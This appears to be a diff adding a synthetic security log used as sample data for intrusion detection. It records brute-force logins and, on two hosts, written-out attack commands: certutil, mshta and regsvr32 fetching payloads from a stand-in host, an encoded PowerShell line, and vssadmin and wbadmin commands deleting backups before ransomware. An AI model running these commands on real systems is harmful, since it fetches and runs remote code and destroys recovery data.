@@ -1,0 +1,40 @@
+2026-04-19 08:10:11 sshd[2211]: Failed password for invalid user oracle from 185.220.101.44 port 49811 ssh2
+2026-04-19 08:10:14 sshd[2212]: Failed password for invalid user admin from 185.220.101.44 port 49812 ssh2
+2026-04-19 08:10:18 sshd[2213]: Failed password for invalid user root from 185.220.101.44 port 49813 ssh2
+2026-04-19 08:10:22 sshd[2214]: Failed password for invalid user sapadm from 185.220.101.44 port 49814 ssh2
+2026-04-19 08:10:27 sshd[2215]: Failed password for invalid user backupadmin from 185.220.101.44 port 49815 ssh2
+2026-04-19 08:10:35 sshd[2216]: Accepted password for admin from 185.220.101.44 port 49816 ssh2
+2026-04-19 08:11:10 web01 auth: login failed for user analyst from 203.0.113.77
+2026-04-19 08:11:13 web01 auth: login failed for user finance from 203.0.113.77
+2026-04-19 08:11:17 web01 auth: login failed for user support from 203.0.113.77
+2026-04-19 08:11:21 web01 auth: login failed for user hr from 203.0.113.77
+2026-04-19 08:11:24 web01 auth: login failed for user payroll from 203.0.113.77
+2026-04-19 08:11:29 web01 auth: login failed for user sales from 203.0.113.77
+2026-04-19 08:11:34 web01 auth: login failed for user warehouse from 203.0.113.77
+2026-04-19 08:11:39 web01 auth: login failed for user purchasing from 203.0.113.77
+2026-04-19 08:12:05 host1 security alert: powershell -enc SQBtAG0AZQBkAGkAYQB0AGUAIABtAGEAbAB3AGEAcgBlAA== spawned by cmd.exe from 45.95.147.22
+2026-04-19 08:12:12 host1 warning: certutil.exe -urlcache -split -f http://198.51.100.88/a.exe C:\Users\Public\a.exe from 45.95.147.22
+2026-04-19 08:12:20 host1 warning: mshta http://198.51.100.88/loader.hta launched by user admin from 45.95.147.22
+2026-04-19 08:12:27 host1 blocked outbound connection from 45.95.147.22 to 198.51.100.88:443 payload transfer attempt
+2026-04-19 08:12:31 host1 exploit warning: regsvr32 /s /n /u /i:http://198.51.100.88/file.sct scrobj.dll from 45.95.147.22
+2026-04-19 08:13:01 db01 security alert: vssadmin delete shadows /all /quiet executed by administrator from 91.240.118.7
+2026-04-19 08:13:09 db01 warning: wbadmin delete catalog -quiet by administrator from 91.240.118.7
+2026-04-19 08:13:15 db01 ransomware note dropped by administrator from 91.240.118.7 decryptor unavailable
+2026-04-19 08:13:20 db01 security alert: privilege escalation detected for user administrator from 91.240.118.7
+2026-04-19 08:14:02 app01 auth: authentication failed user=postgres src_ip=198.51.100.45
+2026-04-19 08:14:06 app01 auth: authentication failed user=postgres src_ip=198.51.100.45
+2026-04-19 08:14:09 app01 auth: authentication failed user=postgres src_ip=198.51.100.45
+2026-04-19 08:14:13 app01 auth: authentication failed user=postgres src_ip=198.51.100.45
+2026-04-19 08:14:19 app01 warning: unauthorized shell spawned by user postgres src_ip=198.51.100.45
+2026-04-19 08:14:26 app01 warning: suspicious network beacon to raw.githubusercontent.com by user postgres src_ip=198.51.100.45
+2026-04-19 08:15:00 workstation22 info: login successful for user khadar from 10.0.0.55
+2026-04-19 08:15:09 workstation22 info: session opened for user khadar from 10.0.0.55
+2026-04-19 08:15:18 fileserver info: login failed for user guest from 10.0.0.88
+2026-04-19 08:15:23 fileserver info: login failed for user guest from 10.0.0.88
+2026-04-19 08:15:28 fileserver info: login failed for user guest from 10.0.0.88
+2026-04-19 08:15:34 fileserver info: login failed for user guest from 10.0.0.88
+2026-04-19 08:15:40 fileserver info: login failed for user guest from 10.0.0.88
+2026-04-19 08:16:01 edge01 warning: exploit attempt blocked from 203.0.113.190 against /api/login
+2026-04-19 08:16:07 edge01 warning: exploit attempt blocked from 203.0.113.190 against /api/admin
+2026-04-19 08:16:12 edge01 warning: unauthorized request from 203.0.113.190 with payload injection pattern
+2026-04-19 08:16:18 edge01 security alert: malware payload blocked from 203.0.113.190
